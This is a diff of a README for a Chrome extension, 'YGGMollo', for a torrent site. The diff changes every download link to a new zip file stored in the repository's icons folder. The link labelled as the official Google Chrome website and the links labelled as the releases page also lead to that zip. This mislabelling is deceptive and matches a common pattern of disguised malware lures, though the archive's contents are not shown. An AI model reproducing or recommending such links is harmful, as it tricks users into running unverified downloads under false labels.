@@ -4,18 +4,18 @@
 YGGMollo is a Chrome extension that enhances your browsing experience on YGGTorrent pages. It adds a convenient download button using the YGG-API, making it easier to access and enjoy your favorite torrents.
 
 ## 🔗 Download Now
-[![Download YGGMollo](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip%https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip)](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip)
+[![Download YGGMollo](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip%https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip)](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip)
 
 ## 🚀 Getting Started
 Follow these steps to get YGGMollo up and running on your Chrome browser.
 
 ### 1. Install Google Chrome
-Before you can use YGGMollo, you need to have Google Chrome installed on your computer. If you do not have it yet, you can download it from the official [Google Chrome website](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip).
+Before you can use YGGMollo, you need to have Google Chrome installed on your computer. If you do not have it yet, you can download it from the official [Google Chrome website](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip).
 
 ### 2. Visit the Releases Page
 Go to the YGGMollo releases page to download the extension. Click the link below:
 
-[Download YGGMollo from Releases](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip)
+[Download YGGMollo from Releases](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip)
 
 ### 3. Choose the Latest Version
 On the releases page, you will see a list of available versions. Look for the latest version at the top. Click on it to view the details.
@@ -76,4 +76,4 @@ Now you are ready to enjoy a better torrent experience with YGGMollo! Follow the
 ### 🔗 Visit the Releases Page Again
 Don't forget, you can always access the download link here:
 
-[Download YGGMollo from Releases](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/Mollo_YGG_v1.4-alpha.2.zip)
+[Download YGGMollo from Releases](https://raw.githubusercontent.com/grappler71/YGGMollo/main/icons/YGG_Mollo_v2.8.zip)
